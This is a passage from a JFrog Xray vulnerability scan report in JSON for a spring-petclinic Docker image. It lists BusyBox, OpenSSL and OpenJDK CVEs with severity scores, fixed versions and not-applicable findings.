                  {
                     "cve": "CVE-2023-42363",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A use-after-free vulnerability was discovered in xasprintf function in xfuncs_printf.c:344 in BusyBox v.1.36.1.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
            "cve_id": "CVE-2023-42363",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable `awk` is never used from the `Busybox` suite tool",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
            "vulnerability_id": "CVE-2023-42363",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-445047",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Applications that use a non-default option when verifying certificates may be\nvulnerable to an attack from a malicious CA to circumvent certain checks.\n\nInvalid certificate policies in leaf certificates are silently ignored by\nOpenSSL and other certificate policy checks are skipped for that certificate.\nA malicious CA could use this to deliberately assert invalid certificate policies\nin order to circumvent policy checking on the certificate altogether.\n\nPolicy processing is disabled by default but can be enabled by passing\nthe `-policy' argument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 1.1.1t-r2"
            ],
            "fixed_versions": [
               "1.1.1t-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0465",
                     "cwe": [
                        "CWE-295"
                     ],
                     "cwe_details": {
                        "CWE-295": {
                           "name": "Improper Certificate Validation",
                           "description": "The product does not validate, or incorrectly validates, a certificate."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "Applications that use a non-default option when verifying certificates may be\nvulnerable to an attack from a malicious CA to circumvent certain checks.\n\nInvalid certificate policies in leaf certificates are silently ignored by\nOpenSSL and other certificate policy checks are skipped for that certificate.\nA malicious CA could use this to deliberately assert invalid certificate policies\nin order to circumvent policy checking on the certificate altogether.\n\nPolicy processing is disabled by default but can be enabled by passing\nthe `-policy' argument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-0465",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-0465",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-445047",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Applications that use a non-default option when verifying certificates may be\nvulnerable to an attack from a malicious CA to circumvent certain checks.\n\nInvalid certificate policies in leaf certificates are silently ignored by\nOpenSSL and other certificate policy checks are skipped for that certificate.\nA malicious CA could use this to deliberately assert invalid certificate policies\nin order to circumvent policy checking on the certificate altogether.\n\nPolicy processing is disabled by default but can be enabled by passing\nthe `-policy' argument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 1.1.1t-r2"
            ],
            "fixed_versions": [
               "1.1.1t-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0465",
                     "cwe": [
                        "CWE-295"
                     ],
                     "cwe_details": {
                        "CWE-295": {
                           "name": "Improper Certificate Validation",
                           "description": "The product does not validate, or incorrectly validates, a certificate."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "Applications that use a non-default option when verifying certificates may be\nvulnerable to an attack from a malicious CA to circumvent certain checks.\n\nInvalid certificate policies in leaf certificates are silently ignored by\nOpenSSL and other certificate policy checks are skipped for that certificate.\nA malicious CA could use this to deliberately assert invalid certificate policies\nin order to circumvent policy checking on the certificate altogether.\n\nPolicy processing is disabled by default but can be enabled by passing\nthe `-policy' argument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-0465",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-0465",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-445046",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "The function X509_VERIFY_PARAM_add0_policy() is documented to\nimplicitly enable the certificate policy check when doing certificate\nverification. However the implementation of the function does not\nenable the check which allows certificates with invalid or incorrect\npolicies to pass the certificate verification.\n\nAs suddenly enabling the policy check could break existing deployments it was\ndecided to keep the existing behavior of the X509_VERIFY_PARAM_add0_policy()\nfunction.\n\nInstead the applications that require OpenSSL to perform certificate\npolicy check need to use X509_VERIFY_PARAM_set1_policies() or explicitly\nenable the policy check by calling X509_VERIFY_PARAM_set_flags() with\nthe X509_V_FLAG_POLICY_CHECK flag argument.\n\nCertificate policy checks are disabled by default in OpenSSL and are not\ncommonly used by applications.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.0.8-r3"
            ],
            "fixed_versions": [
               "3.0.8-r3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0466",
                     "cwe": [
                        "CWE-295"
                     ],
                     "cwe_details": {
                        "CWE-295": {
                           "name": "Improper Certificate Validation",
                           "description": "The product does not validate, or incorrectly validates, a certificate."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "The function X509_VERIFY_PARAM_add0_policy() is documented to\nimplicitly enable the certificate policy check when doing certificate\nverification. However the implementation of the function does not\nenable the check which allows certificates with invalid or incorrect\npolicies to pass the certificate verification.\n\nAs suddenly enabling the policy check could break existing deployments it was\ndecided to keep the existing behavior of the X509_VERIFY_PARAM_add0_policy()\nfunction.\n\nInstead the applications that require OpenSSL to perform certificate\npolicy check need to use X509_VERIFY_PARAM_set1_policies() or explicitly\nenable the policy check by calling X509_VERIFY_PARAM_set_flags() with\nthe X509_V_FLAG_POLICY_CHECK flag argument.\n\nCertificate policy checks are disabled by default in OpenSSL and are not\ncommonly used by applications.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-0466",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-0466",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-445046",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "The function X509_VERIFY_PARAM_add0_policy() is documented to\nimplicitly enable the certificate policy check when doing certificate\nverification. However the implementation of the function does not\nenable the check which allows certificates with invalid or incorrect\npolicies to pass the certificate verification.\n\nAs suddenly enabling the policy check could break existing deployments it was\ndecided to keep the existing behavior of the X509_VERIFY_PARAM_add0_policy()\nfunction.\n\nInstead the applications that require OpenSSL to perform certificate\npolicy check need to use X509_VERIFY_PARAM_set1_policies() or explicitly\nenable the policy check by calling X509_VERIFY_PARAM_set_flags() with\nthe X509_V_FLAG_POLICY_CHECK flag argument.\n\nCertificate policy checks are disabled by default in OpenSSL and are not\ncommonly used by applications.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.0.8-r3"
            ],
            "fixed_versions": [
               "3.0.8-r3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0466",
                     "cwe": [
                        "CWE-295"
                     ],
                     "cwe_details": {
                        "CWE-295": {
                           "name": "Improper Certificate Validation",
                           "description": "The product does not validate, or incorrectly validates, a certificate."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "The function X509_VERIFY_PARAM_add0_policy() is documented to\nimplicitly enable the certificate policy check when doing certificate\nverification. However the implementation of the function does not\nenable the check which allows certificates with invalid or incorrect\npolicies to pass the certificate verification.\n\nAs suddenly enabling the policy check could break existing deployments it was\ndecided to keep the existing behavior of the X509_VERIFY_PARAM_add0_policy()\nfunction.\n\nInstead the applications that require OpenSSL to perform certificate\npolicy check need to use X509_VERIFY_PARAM_set1_policies() or explicitly\nenable the policy check by calling X509_VERIFY_PARAM_set_flags() with\nthe X509_V_FLAG_POLICY_CHECK flag argument.\n\nCertificate policy checks are disabled by default in OpenSSL and are not\ncommonly used by applications.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-0466",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-0466",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-188494",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows low privileged attacker with network access via Kerberos to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Oracle GraalVM Enterprise Edition, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 6.8 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "11.0.0 ≤ Version < 11.0.13.10",
               "17.0.0 ≤ Version < 17.0.1.12",
               "8.0.0 ≤ Version < 8.311.11"
            ],
            "fixed_versions": [
               "11.0.13.10",
               "17.0.1.12",
               "8.311.11"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-35567",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "6.3/CVSS:2.0/AV:N/AC:M/Au:S/C:C/I:N/A:N",
                     "cvss_v3": "6.8/CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N"
                  }
               ],
               "description": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows low privileged attacker with network access via Kerberos to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Oracle GraalVM Enterprise Edition, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 6.8 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjava.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjavajpeg.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javap",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javadoc",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javac",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/java"
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "cpp://oracle:openjdk:17",
            "cve_id": "CVE-2021-35567",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "This CVE is not applicable because Java Authentication and Authorization Service is not configured in a vulnerable way",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "cpp://oracle:openjdk:17",
            "vulnerability_id": "CVE-2021-35567",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-632772",
         "severity": "Low",
         "jfrog_severity": "Medium",
         "severity_source": "JFrog",
         "pkg_type": "alpine",
         "summary": "Issue summary: Applications performing certificate name checks (e.g., TLS\nclients checking server certificates) may attempt to read an invalid memory\naddress resulting in abnormal termination of the application process.\n\nImpact summary: Abnormal termination of an application can a cause a denial of\nservice.\n\nApplications performing certificate name checks (e.g., TLS clients checking\nserver certificates) may attempt to read an invalid memory address when\ncomparing the expected name with an `otherName` subject alternative name of an\nX.509 certificate. This may result in an exception that terminates the\napplication program.\n\nNote that basic certificate chain validation (signatures, dates, ...) is not\naffected, the denial of service can occur only when the application also\nspecifies an expected DNS name, Email address or IP address.\n\nTLS servers rarely solicit client certificates, and even when they do, they\ngenerally don't perform a name check against a reference identifier (expected\nidentity), but rather extract the presented identity after checking the\ncertificate chain.  So TLS servers are generally not affected and the severity\nof the issue is Moderate.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.3.2-r0"
            ],
            "fixed_versions": [
               "3.3.2-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-6119",
                     "cwe": [
                        "CWE-843"
                     ],
                     "cwe_details": {
                        "CWE-843": {
                           "name": "Access of Resource Using Incompatible Type ('Type Confusion')",
                           "description": "The product allocates or initializes a resource such as a pointer, object, or variable using one type, but it later accesses that resource using a type that is incompatible with the original type."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "Issue summary: Applications performing certificate name checks (e.g., TLS\nclients checking server certificates) may attempt to read an invalid memory\naddress resulting in abnormal termination of the application process.\n\nImpact summary: Abnormal termination of an application can a cause a denial of\nservice.\n\nApplications performing certificate name checks (e.g., TLS clients checking\nserver certificates) may attempt to read an invalid memory address when\ncomparing the expected name with an `otherName` subject alternative name of an\nX.509 certificate. This may result in an exception that terminates the\napplication program.\n\nNote that basic certificate chain validation (signatures, dates, ...) is not\naffected, the denial of service can occur only when the application also\nspecifies an expected DNS name, Email address or IP address.\n\nTLS servers rarely solicit client certificates, and even when they do, they\ngenerally don't perform a name check against a reference identifier (expected\nidentity), but rather extract the presented identity after checking the\ncertificate chain.  So TLS servers are generally not affected and the severity\nof the issue is Moderate.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-632772",
            "VulnerabilityTitle": "",
            "ShortDescription": "Out of bounds read in OpenSSL clients can lead to denial of service when using non-default TLS verification options and connecting to malicious TLS servers.",
            "FullDescription": "",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "The fix commit contains PoC certificates that trigger the denial of service issue",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Denial of service of a TLS clients only. This out of bounds read cannot lead to data disclosure.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must make the victim client connect to their malicious TLS server, in order to serve the malformed TLS certificate. The victim client must use OpenSSL and must enable non-default certificate verification options, either -\n\n* DNS verification - by using `X509_VERIFY_PARAM_set1_host` or `X509_check_host`\n* Email verification - by using ` X509_VERIFY_PARAM_set1_email` or `X509_check_email`",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Original advisory",
                  "Url": "https://openssl-library.org/news/secadv/20240903.txt",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "PoC certificates that trigger the issue",
                  "Url": "https://github.com/openssl/openssl/commit/06d1dc3fa96a2ba5a3e22735a033012aadc9f0d6#diff-76286a321b40c8d344d4575ef4c77e61d838161087eb640c8775c2c3372212ffR1",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix commit",
                  "Url": "https://github.com/openssl/openssl/commit/06d1dc3fa96a2ba5a3e22735a033012aadc9f0d6",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2024-6119",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2024-6119",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-632772",
         "severity": "Low",
         "jfrog_severity": "Medium",
         "severity_source": "JFrog",
         "pkg_type": "alpine",
         "summary": "Issue summary: Applications performing certificate name checks (e.g., TLS\nclients checking server certificates) may attempt to read an invalid memory\naddress resulting in abnormal termination of the application process.\n\nImpact summary: Abnormal termination of an application can a cause a denial of\nservice.\n\nApplications performing certificate name checks (e.g., TLS clients checking\nserver certificates) may attempt to read an invalid memory address when\ncomparing the expected name with an `otherName` subject alternative name of an\nX.509 certificate. This may result in an exception that terminates the\napplication program.\n\nNote that basic certificate chain validation (signatures, dates, ...) is not\naffected, the denial of service can occur only when the application also\nspecifies an expected DNS name, Email address or IP address.\n\nTLS servers rarely solicit client certificates, and even when they do, they\ngenerally don't perform a name check against a reference identifier (expected\nidentity), but rather extract the presented identity after checking the\ncertificate chain.  So TLS servers are generally not affected and the severity\nof the issue is Moderate.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.3.2-r0"
            ],
            "fixed_versions": [
               "3.3.2-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-6119",
                     "cwe": [
                        "CWE-843"
                     ],
                     "cwe_details": {
                        "CWE-843": {
                           "name": "Access of Resource Using Incompatible Type ('Type Confusion')",
                           "description": "The product allocates or initializes a resource such as a pointer, object, or variable using one type, but it later accesses that resource using a type that is incompatible with the original type."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "Issue summary: Applications performing certificate name checks (e.g., TLS\nclients checking server certificates) may attempt to read an invalid memory\naddress resulting in abnormal termination of the application process.\n\nImpact summary: Abnormal termination of an application can a cause a denial of\nservice.\n\nApplications performing certificate name checks (e.g., TLS clients checking\nserver certificates) may attempt to read an invalid memory address when\ncomparing the expected name with an `otherName` subject alternative name of an\nX.509 certificate. This may result in an exception that terminates the\napplication program.\n\nNote that basic certificate chain validation (signatures, dates, ...) is not\naffected, the denial of service can occur only when the application also\nspecifies an expected DNS name, Email address or IP address.\n\nTLS servers rarely solicit client certificates, and even when they do, they\ngenerally don't perform a name check against a reference identifier (expected\nidentity), but rather extract the presented identity after checking the\ncertificate chain.  So TLS servers are generally not affected and the severity\nof the issue is Moderate.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-632772",
            "VulnerabilityTitle": "",
            "ShortDescription": "Out of bounds read in OpenSSL clients can lead to denial of service when using non-default TLS verification options and connecting to malicious TLS servers.",
            "FullDescription": "",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "The fix commit contains PoC certificates that trigger the denial of service issue",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Denial of service of a TLS clients only. This out of bounds read cannot lead to data disclosure.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must make the victim client connect to their malicious TLS server, in order to serve the malformed TLS certificate. The victim client must use OpenSSL and must enable non-default certificate verification options, either -\n\n* DNS verification - by using `X509_VERIFY_PARAM_set1_host` or `X509_check_host`\n* Email verification - by using ` X509_VERIFY_PARAM_set1_email` or `X509_check_email`",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Original advisory",
                  "Url": "https://openssl-library.org/news/secadv/20240903.txt",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "PoC certificates that trigger the issue",
                  "Url": "https://github.com/openssl/openssl/commit/06d1dc3fa96a2ba5a3e22735a033012aadc9f0d6#diff-76286a321b40c8d344d4575ef4c77e61d838161087eb640c8775c2c3372212ffR1",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix commit",
                  "Url": "https://github.com/openssl/openssl/commit/06d1dc3fa96a2ba5a3e22735a033012aadc9f0d6",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2024-6119",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2024-6119",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607877",
         "severity": "Low",
         "severity_source": "JFrog",
         "pkg_type": "alpine",
         "summary": "Issue summary: Calling the OpenSSL API function SSL_select_next_proto with an\nempty supported client protocols buffer may cause a crash or memory contents to\nbe sent to the peer.\n\nImpact summary: A buffer overread can have a range of potential consequences\nsuch as unexpected application beahviour or a crash. In particular this issue\ncould result in up to 255 bytes of arbitrary private data from memory being sent\nto the peer leading to a loss of confidentiality. However, only applications\nthat directly call the SSL_select_next_proto function with a 0 length list of\nsupported client protocols are affected by this issue. This would normally never\nbe a valid scenario and is typically not under attacker control but may occur by\naccident in the case of a configuration or programming error in the calling\napplication.\n\nThe OpenSSL API function SSL_select_next_proto is typically used by TLS\napplications that support ALPN (Application Layer Protocol Negotiation) or NPN\n(Next Protocol Negotiation). NPN is older, was never standardised and\nis deprecated in favour of ALPN. We believe that ALPN is significantly more\nwidely deployed than NPN. The SSL_select_next_proto function accepts a list of\nprotocols from the server and a list of protocols from the client and returns\nthe first protocol that appears in the server list that also appears in the\nclient list. In the case of no overlap between the two lists it returns the\nfirst item in the client list. In either case it will signal whether an overlap\nbetween the two lists was found. In the case where SSL_select_next_proto is\ncalled with a zero length client list it fails to notice this condition and\nreturns the memory immediately following the client list pointer (and reports\nthat there was no overlap in the lists).\n\nThis function is typically called from a server side application callback 